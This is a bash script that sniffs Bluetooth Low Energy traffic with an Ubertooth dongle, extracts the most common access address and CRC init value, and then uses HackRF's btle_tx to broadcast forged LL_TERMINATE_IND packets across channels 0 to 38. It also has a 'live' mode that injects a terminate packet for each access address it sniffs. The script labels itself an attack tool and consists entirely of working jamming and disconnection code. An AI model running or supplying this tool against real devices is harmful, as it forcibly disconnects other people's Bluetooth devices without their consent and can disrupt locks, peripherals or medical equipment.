#!/bin/bash
# **Work in Progress**
function ble_init 
    {
       echo -e "\nDump interrupted"
       grep -B2 'LL Data PDU' dump | awk '/AA/ {print $4}' > val
       awk '/CRC/ {print $2$3$4}' dump > crc
       if [ -s val ] 
       then 
           echo "Found the packet"
       else
           echo "Didn't find the packet, try again :("
           exit
       fi
       awk '/CRC/ { print $2 $3 $4}' dump >> val
       # Shouldn't really create a issue for the packet
       crc=$(sort crc | uniq -c | sort -rn | sed -E 's/^ *[0-9]+ //g'| head -1)
       # The most common Access Adress
       addr=$(sort val | uniq -c | sort -rn | head -1 | awk '{ print $2 }')
       echo "The most common Access Address:" $addr
       echo "Intiating transmission via HackRF"
       echo $crc
       trans
   }
function trans
    {
        for i in `seq 0 38`;
        do 
        # Error Code-11 (Connection Already Exists) 
        ./Binaries/btle_tx $i-LL_TERMINATE_IND-AA-$addr-LLID-3-NESN-0-SN-0-MD-0-ErrorCode-11-CRCInit-$crc r3 
        done
        exit_sp
    }
function exit_sp 
    {
        # Clean-Up the files
        rm val dump crc 2> /dev/null
        # Comment out the data if you require the data 
        rm PHY_bit_for_matlab.txt IQ_sample_for_matlab.txt IQ_sample.txt IQ_sample_byte.txt info_byte.txt phy_byte.txt phy_sample.txt 2> /dev/null 
        exit
    }
function probable
    {
        echo "Press Ctrl+C to stop scanning for packets"
        # Establish interrupt handler
        trap ble_init INT
        # Scanning ...
        # Sudo is optional, depending upon your config
        sudo ubertooth-btle -pI > dump
    }
function live_ble 
    {
       echo "Sending packets on channel" $ch
       trap exit_sp INT
       sudo ubertooth-btle -v0 -pI | ch=$ch awk '/AA/ { system("./Binaries/btle_tx $ch-LL_TERMINATE_IND-AA-"$4"-LLID-3-NESN-0-SN-0-MD-0-ErrorCode-11-CRCInit-A77B22 r3") }'
        # Setting trap for exiting
    }
function live
    {
        echo 'Getting paras from Ubertooth'
        read -p "The freq you want to get your data " freq
        sudo ubertooth-util -c$freq
        read -p "The channel you want to send the data " ch
        sudo ubertooth-util -C
        live_ble
    }
# Init
echo "Resetting ops"
echo "Press RESET BUTTON on the HACKRF to exit LIVE mode"
sudo ubertooth-util -r 
read -p  "Select Attack Mode 1. Probable (p)  2.Live (l) " pl
case $pl in
    [Pp]* ) probable ;; 
    [Ll]* ) live ;;
    *) echo 'Answer in P/L';;
    esac
